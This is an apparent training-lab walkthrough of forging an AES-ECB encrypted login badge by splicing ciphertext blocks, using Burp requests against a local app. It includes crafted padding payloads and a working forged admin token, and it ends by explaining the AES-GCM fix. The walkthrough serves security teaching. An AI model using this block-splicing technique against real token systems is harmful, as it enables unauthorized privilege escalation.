# Walkthrough — crypto-ecb-mode

The app is a login API: you `POST` an email and password, it hands back an encrypted **badge** — a token carrying who you are and your role — and every protected request decrypts that badge to decide what to serve. The authorization is correct: it reads the role and gates on it. The problem is the *mode* the badge is encrypted with: AES-ECB. A block cipher encrypts in fixed 16-byte chunks; ECB encrypts each chunk on its own, with the same key. So identical plaintext blocks become identical ciphertext blocks, and — because the blocks are independent — you can cut and rearrange blocks from legitimate badges to assemble one that decrypts to `role=admin`, without ever knowing the key.

The track is **Burp Suite (Repeater + Decoder)**, start to finish. You read a badge from a login response, rearrange its ciphertext blocks by hand, and replay it; the proof is the HTTP response. Nothing is cracked — the key is never touched — so there is no offline tool, and there is no browser.

## 1. Context

A small login API on `127.0.0.1:8032` (vulnerable) and `127.0.0.1:8132` (fixed):

- `GET /` — a JSON banner. Not the target.
- `POST /login` — JSON `{"email", "password"}`. Builds the plaintext `email=<email>&role=user`, encrypts it, and returns `{"badge": "<hex>"}`. The role is **always** `user` — the server never issues an admin badge. You have to forge it.
- `GET /me` — reads the badge from `Authorization: Bearer <hex>`, decrypts it, parses `email=...&role=...`, and answers by role: `user` gets their own profile, `admin` gets a privileged area.

This atom is **A02 — Cryptographic Failures**: the mode chosen to protect the token in transit is the wrong one.

Terms, defined once:

- **Block cipher / 16-byte block.** AES is a *block cipher*: it encrypts fixed-size chunks — **16 bytes** each. A message longer than 16 bytes needs a rule for chaining blocks together.
- **Mode of operation.** That rule. **ECB (Electronic Codebook)** is the naive one: each 16-byte block is encrypted *independently*, with the same key, unrelated to its neighbours.
- **Deterministic, block by block.** Under ECB the *same* 16 plaintext bytes always produce the *same* ciphertext block — so the structure of the plaintext shows through in the ciphertext (the classic "ECB penguin": encrypt a picture of a penguin in ECB and you can still see the penguin — see the primer).
- **Cut-and-paste / block-splicing.** Because the blocks are independent, you can reorder, drop, or paste ciphertext blocks from different tokens; each one still decrypts to the same plaintext, wherever it lands.
- **PKCS#7 padding.** The plaintext is rarely an exact multiple of 16 bytes, so the cipher pads the end; the standard scheme, **PKCS#7**, makes the final *N* bytes all equal *N*. This detail is load-bearing for the splice below.
- **Authenticated mode / AEAD.** A mode that also proves the ciphertext wasn't altered. **GCM (Galois/Counter Mode)** is one: it attaches an authentication **tag** that binds the ciphertext, and uses a unique **nonce** (number used once) per message so the same plaintext encrypts differently every time. It's the fix here.

The badge is **hex-encoded**, so one 16-byte block is exactly **32 hex characters** — block boundaries fall on a character, which is what lets you splice by hand in Repeater. The whole exploit is Burp; the key is never involved.

## 2. See the pattern leak (the tell)

Before forging anything, prove the core property: identical plaintext → identical ciphertext. Send a login whose email is a repeated pattern. `email=` is 6 bytes, so 10 filler characters fill out the first block; then 32 identical characters are two whole blocks of the same content:

```
POST /login HTTP/1.1
Host: 127.0.0.1:8032
Content-Type: application/json

{"email": "AAAAAAAAAABBBBBBBBBBBBBBBBBBBBBBBBBBBBBBBB", "password": "x"}
```

Response:

```json
{"badge":"1746f6b5415b93574b06b055fe3b500c2c37d6789f403283b3f8bd6e9ca8221e2c37d6789f403283b3f8bd6e9ca8221e3215aba376ac0f41aafea45af8daa6df"}
```

Split it into 32-hex-char (16-byte) blocks and line them up:

```
block 0: 1746f6b5415b93574b06b055fe3b500c   email=AAAAAAAAAA
block 1: 2c37d6789f403283b3f8bd6e9ca8221e   BBBBBBBBBBBBBBBB
block 2: 2c37d6789f403283b3f8bd6e9ca8221e   BBBBBBBBBBBBBBBB   <-- identical to block 1
block 3: 3215aba376ac0f41aafea45af8daa6df   &role=user + padding
```

Blocks 1 and 2 are byte-for-byte identical — the two runs of `B` encrypted to the same ciphertext. That is the ECB penguin in miniature, right there in the HTTP response. It tells you two things: the encryption is deterministic block-by-block, and blocks are self-contained values you can recognize and move around.

Run the exact same request against the fixed API on `127.0.0.1:8132` and the badge is longer and has **no** repeats:

```
block 0: 5494c9cb09db5d27f285510ed6079af9
block 1: e3c94fa6cfdaf384d5adf3af7deba394
block 2: 84ef81083aad33905a769f62a1108be2
...
```

Send it twice and you get two *different* badges. That's GCM's per-message nonce — the same plaintext encrypts differently every time, so there is no pattern to read and no block to reuse. Hold that thought for section 6.

## 3. Spot the bug

Open [`vulnerable/app.py`](./vulnerable/app.py). Encryption and decryption:

```python
def issue_badge(email, role):
    plaintext = f"email={email}&role={role}".encode()
    cipher = AES.new(KEY, AES.MODE_ECB)
    return cipher.encrypt(pad(plaintext, AES.block_size)).hex()

def read_badge(token):
    cipher = AES.new(KEY, AES.MODE_ECB)
    plaintext = unpad(cipher.decrypt(bytes.fromhex(token)), AES.block_size)
    return dict(kv.split("=", 1) for kv in plaintext.decode().split("&"))
```

The authorization around this is *correct* — `GET /me` decrypts, reads `role`, and only unlocks the admin area when the role is `admin`. There is no missing check and no injection. The bug is the **mode**: `AES.MODE_ECB`. The audit question isn't "does it check the role?" — it does. It's "is ECB the right mode to encrypt an authority token with?" — and it is not: deterministic (leaks the pattern), block-independent (blocks can be rearranged), and unauthenticated (tampering isn't detected). The fix is an authenticated mode.

## 4. Exploitation — forge an admin badge by splicing blocks

The plaintext layout is `email=<email>&role=<role>`, with the role value last. You control the email, so you control how the bytes fall across 16-byte blocks. The plan: get the app to encrypt an `admin` block for you, then paste that block where the `user` block sits in a normal badge.

### 4.1 Baseline

A normal login and what the badge unlocks:

```
POST /login HTTP/1.1
Host: 127.0.0.1:8032
Content-Type: application/json

{"email": "alice@lab.test", "password": "x"}
```

```
GET /me HTTP/1.1
Host: 127.0.0.1:8032
Authorization: Bearer <badge from the response>
```

Response — a plain user:

```json
{"email":"alice@lab.test","role":"user"}
```

### 4.2 Get the app to encrypt an `admin` block

You want a block that is exactly `admin` followed by valid PKCS#7 padding, so that when it becomes the *final* block of a forged badge, `unpad` accepts it and leaves exactly `admin`. `admin` is 5 bytes; a full 16-byte block needs 11 more, and valid PKCS#7 padding for that is 11 bytes of value `0x0b`. So you craft an email that (a) fills the first block with `email=` + 10 characters, then (b) places `admin` + eleven `0x0b` bytes as the next whole block:

```
email = AAAAAAAAAA admin <0x0b x 11>            (the value you send)

plaintext:  email=AAAAAAAAAA | admin<0x0b x 11> | &role=user<pad>
            |--- block 0 ---| |--- block 1 ---| |--- block 2 --->
```

In JSON the `0x0b` bytes are written as the escape `\u000b`. Send it:

```
POST /login HTTP/1.1
Host: 127.0.0.1:8032
Content-Type: application/json

{"email": "AAAAAAAAAAadmin\u000b\u000b\u000b\u000b\u000b\u000b\u000b\u000b\u000b\u000b\u000b", "password": "x"}
```

Response:

```json
{"badge":"1746f6b5415b93574b06b055fe3b500cc17ec934eb6c794d844d7a2003d1b46c3215aba376ac0f41aafea45af8daa6df"}
```

Split into blocks:

```
block 0: 1746f6b5415b93574b06b055fe3b500c   email=AAAAAAAAAA
block 1: c17ec934eb6c794d844d7a2003d1b46c   admin<0x0b x 11>   <-- the block you want
block 2: 3215aba376ac0f41aafea45af8daa6df   &role=user + padding
```

Block 1 — hex characters 33–64 of the badge — is `E(admin + 0x0b x 11)`. Copy it:

```
c17ec934eb6c794d844d7a2003d1b46c
```

### 4.3 Get a victim badge with the role value on its own block

Now line a badge up so the role *value* starts a fresh block, making the last block exactly `user` + padding — replaceable in one move. The prefix `email=<email>&role=` must be a whole number of blocks: `email=` (6) + `&role=` (6) is 12, so a 4-character email makes it 16.

```
email = AAAA

plaintext:  email=AAAA&role= | user<0x0c x 12>
            |--- block 0 ---| |--- block 1 -->
```

```
POST /login HTTP/1.1
Host: 127.0.0.1:8032
Content-Type: application/json

{"email": "AAAA", "password": "x"}
```

Response:

```json
{"badge":"fdbb349e1bf2e4defb99cda6ec6767fa489d221bc6eff5a78458caa13d992b11"}
```

```
block 0: fdbb349e1bf2e4defb99cda6ec6767fa   email=AAAA&role=
block 1: 489d221bc6eff5a78458caa13d992b11   user + padding
```

### 4.4 Splice and spend

Replace block 1 of the victim badge (the `user` block) with the `admin` block from 4.2 — keep block 0, swap the last 32 hex characters:

```
victim:  fdbb349e1bf2e4defb99cda6ec6767fa 489d221bc6eff5a78458caa13d992b11
forged:  fdbb349e1bf2e4defb99cda6ec6767fa c17ec934eb6c794d844d7a2003d1b46c
                                           ^^^^^^ pasted admin block ^^^^^^
```

Decrypted, that is `email=AAAA&role=admin` followed by eleven `0x0b` bytes; `unpad` strips the eleven padding bytes and leaves `email=AAAA&role=admin`. Spend it:

```
GET /me HTTP/1.1
Host: 127.0.0.1:8032
Authorization: Bearer fdbb349e1bf2e4defb99cda6ec6767fac17ec934eb6c794d844d7a2003d1b46c
```

Response — `200`:

```json
{"admin_area":"internal admin dashboard (dummy lab content)","email":"AAAA","role":"admin"}
```

Privilege escalated. You never learned the key, decrypted nothing, and broke no cipher — you took two ciphertext blocks the app handed you and reordered them like Lego. ECB decrypted each block on its own and assembled a plaintext the server never authorized.

> This is a local lab: both apps bind to `127.0.0.1`, the key and data are dummy (`atomicvulns-lab!` is an obviously fake key, the emails are throwaway), and every step ran in Burp against your own containers. Nothing leaves the box, and nothing is destructive.

## 5. What the vuln is NOT

Four wrong conclusions to kill.

**It is not that "the key is weak or leaked."** The key is never broken, guessed, or used by the attacker — the whole splice works without it. The proof is categorical: the fixed side uses the **same** key and the forged badge is rejected (next section). Same key, different outcome — the difference is the mode.

**It is not that "AES is insecure."** AES is fine. The flaw is the *mode*. The fixed side is the same AES with the same key, in GCM, and the attack dies.

**It is not injection.** You didn't inject code or break a parser — you rearranged valid *encrypted* blocks the app itself produced. No input became code.

**It is not the `crypto-weak-hash` problem.** There, a one-way password *hash* is **recovered** by pre-computation (a rainbow table). Here, a reversible *cipher* is **forged** by rearranging blocks — nothing is recovered and nothing is cracked. Same category (A02), opposite mechanism.

## 6. Impact

Token forgery leading to privilege escalation. You mint a badge that decrypts to `role=admin` — with no admin credential and no key — and the server treats you as an administrator. It is **not RCE** (no code runs) and it is **not** key recovery (the key is never obtained); the ceiling is whatever the forged role unlocks. For an authority token, that is the whole point: the boundary the encryption was supposed to enforce is now yours to rewrite.

## 7. Why the fix works

Run the same attack against the fixed API on port **8132** (see [`DIFF.md`](./DIFF.md)). It encrypts the badge with **AES-GCM**. Take the forged badge from section 4 and spend it there:

```
GET /me HTTP/1.1
Host: 127.0.0.1:8132
Authorization: Bearer fdbb349e1bf2e4defb99cda6ec6767fac17ec934eb6c794d844d7a2003d1b46c
```

Response — `400`:

```json
{"error":"invalid badge"}
```

GCM attaches an authentication **tag** over the whole ciphertext. Rearranging blocks makes the tag no longer match, so `decrypt_and_verify` raises and the server rejects the badge **before the role is ever read**. And recall section 2: under GCM the tell is gone too — the per-message **nonce** makes identical plaintext encrypt differently every time, so there is no pattern to read and no block worth lifting.

The isolation proof: log in normally and call `GET /me` with the **intact** badge on **both** ports — you get an identical `200 {"...","role":"user"}`. Only the *tampered* badge tells the sides apart (admin on 8032, rejected on 8132), and that difference traces purely to the mode.

The fix is one thing: swap the mode for an authenticated one. Not "switch to CBC" — that would stop the pattern leak and the clean cut-and-paste, a real improvement, but it leaves the badge unauthenticated and still tamperable by other means; leaving ECB is necessary, not sufficient. Not "change the key," not "add more AES." An authenticated mode (GCM) — see [`DIFF.md`](./DIFF.md) for the diff and why the half-fixes don't hold.
